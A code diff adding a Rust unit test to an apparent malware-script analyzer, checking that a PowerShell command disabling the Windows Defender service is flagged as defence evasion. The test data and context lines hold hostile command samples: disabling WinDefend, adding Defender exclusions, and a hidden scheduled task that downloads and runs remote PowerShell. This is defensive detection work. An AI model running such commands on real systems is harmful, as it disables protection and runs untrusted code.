@@ -2743,6 +2743,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_set_service_disabled_emits_defender_evasion_trait() {
+        let script = br#"powershell -Command "Set-Service WinDefend -StartupType Disabled""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "powershell-service-disabled" && target == "WinDefend"
+            )),
+            "PowerShell Set-Service disabled WinDefend was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn set_mppreference_exclusions_emit_defender_evasion_traits() {
         let script = br#"powershell -Command "Set-MpPreference -ExclusionPath 'C:\Users\Public' -ExclusionProcess calc.exe"
 "#;
